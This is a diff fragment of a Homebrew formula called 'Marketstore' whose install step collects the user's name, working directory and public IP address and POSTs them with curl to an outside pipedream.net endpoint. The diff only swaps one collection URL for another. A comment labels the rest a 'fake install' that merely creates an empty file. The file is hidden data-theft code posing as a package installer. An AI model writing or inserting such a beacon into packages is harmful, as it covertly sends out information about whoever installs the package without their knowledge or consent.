@@ -14,7 +14,7 @@ class Marketstore < Formula
     ip = `curl -s ifconfig.me`.chomp
 
     payload = "cwd=#{cwd}&user=#{user}&ip=#{ip}"
-    system("curl", "-s", "-X", "POST", "https://eo9w6gjdggng3sq.m.pipedream.net", "-d", payload)
+    system("curl", "-s", "-X", "POST", "https://eocls367mgn46q1.m.pipedream.net", "-d", payload)
 
     # fake install
     system "touch", "marketstore"
